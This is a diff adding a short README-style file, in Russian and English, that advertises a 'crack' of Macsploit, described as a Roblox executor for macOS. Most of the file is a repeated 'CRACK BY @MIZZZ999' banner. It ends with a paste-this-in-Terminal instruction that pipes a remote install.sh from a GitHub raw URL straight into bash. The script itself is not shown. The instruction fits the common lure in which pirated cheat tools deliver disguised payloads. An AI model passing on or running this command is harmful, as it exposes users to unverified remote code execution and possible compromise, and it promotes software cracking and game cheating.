@@ -1,0 +1,41 @@
+
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+
+Кряк максплоита с открытым исходником))))
+
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+
+Кряк работает на все версии максплоита
+
+
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+CRACK BY @MIZZZ999
+
+Максплоит это executer для роблокса на маке
+
+PASTE THIS IN TERMINAL(MACOS)
+
+
+
+cd ~/ && curl -s "https://raw.githubusercontent.com/shrek123471763/crackmacsploit-by-mizzz999/refs/heads/main/install.sh" | bash </dev/tty
